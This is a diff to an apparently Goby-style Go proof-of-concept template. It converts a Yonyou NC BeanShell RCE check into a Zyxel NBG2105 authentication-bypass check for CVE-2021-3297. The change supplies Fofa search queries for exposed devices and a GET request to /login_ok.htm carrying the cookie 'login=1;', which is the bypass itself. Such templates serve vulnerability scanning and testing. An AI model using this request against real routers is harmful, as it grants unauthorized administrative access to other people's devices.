@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "Zyxel NBG2105 身份验证绕过 CVE-2021-3297",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"ZyXEL-NBG2105\" || product=\"ZyXEL-NBG2105\"",
+  "GobyQuery": "app=\"ZyXEL-NBG2105\" || product=\"ZyXEL-NBG2105\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -30,9 +30,11 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "uri": "/login_ok.htm",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Cookie": "login=1;"
+        },
         "data_type": "text",
         "data": ""
       },
@@ -51,7 +53,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "GMT",
             "bz": ""
           }
         ]
@@ -107,7 +109,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "Zyxel NBG2105 身份验证绕过 CVE-2021-3297",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +118,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "Zyxel NBG2105 Authentication Bypass CVE-2021-3297",
       "Product": "",
       "Description": "",
       "Recommendation": "",
